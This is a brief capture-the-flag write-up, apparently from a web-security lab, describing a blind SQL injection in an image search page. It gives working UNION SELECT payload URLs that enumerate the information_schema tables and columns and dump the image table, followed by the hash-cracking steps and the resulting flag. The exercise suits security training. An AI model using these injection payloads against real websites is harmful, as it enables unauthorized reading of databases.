The imagesearch input is vulnerable to a blind sql injection.
it's blind because dbms errors and warnings are not displayed on the page
due to another sql injection vulnerability in the website, we were previously able to retrieive database structure by querrying the mysql's information_schema database.
To do so we must find database tables and columns, which can be achieved by forging special querries as:
- find tables names :
http://172.16.0.128/index.php?page=member&id=1+UNION+SELECT%20table_name%2C+table_schema+from+information_schema.tables&Submit=Submit#
-find columns names : 
http://172.16.0.128/index.php?page=member&id=1+UNION+SELECT%20column_name%2C+table_schema+from+information_schema.columns&Submit=Submit#
Now that we know the Member_Image database structure, we can forge a query to get the missing images informations:

http://172.16.0.128/index.php?page=searchimg&id=1+UNION+SELECT%20title,comment%20FROM list_images&Submit=Submit#

We can then read this :

ID: 1 UNION SELECT title,comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

1928e8083cf461a51303633093573c46 md5 decrypt gives "albatroz", to sha256 gives the flag -> "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"
